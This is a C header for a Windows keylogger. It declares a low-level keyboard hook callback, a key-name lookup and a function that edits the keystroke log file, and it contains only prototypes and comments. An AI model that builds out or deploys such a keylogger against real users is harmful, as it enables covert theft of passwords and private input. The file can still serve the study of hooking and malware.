#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>

extern FILE *file;

/**
 * @brief Retrieves the name of a key given its virtual-key code.
 *
 * @param vkCode The virtual-key code of the key.
 * @return A pointer to a string containing the name of the key.
 */
const char* get_key_name(DWORD vkCode);

/**
 * @brief Callback function for handling keyboard events.
 *
 * This function is called whenever a keyboard event is intercepted by the hook.
 * It processes the event based on the provided parameters.
 *
 * @param code The hook code passed to the callback function. If code is less than zero,
 *             the hook procedure must pass the message to the CallNextHookEx function
 *             without further processing and should return the value returned by CallNextHookEx.
 * @param wparam The identifier of the keyboard message. This parameter can be one of the following values:
 *               WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
 * @param lparam A pointer to a KBDLLHOOKSTRUCT structure that contains information about the keyboard event.
 * 
 * @return If code is less than zero, the hook procedure must return the value returned by CallNextHookEx.
 *         If code is greater than or equal to zero, and the hook procedure processed the message,
 *         it should return a nonzero value to prevent the system from passing the message to the target window procedure.
 *         Otherwise, it should return zero.
 */
LRESULT CALLBACK hook_proc(int code, WPARAM wparam, LPARAM lparam);


/**
 * @brief Removes the last character from a file.
 *
 * This function opens a file and removes the last character from it.
 * It is useful for scenarios where you need to delete the last character
 * that was written to a file, such as in a keylogger application.
 *
 * @note Ensure that the file is accessible and has write permissions.
 */
void remove_last_char_from_file();


#endif
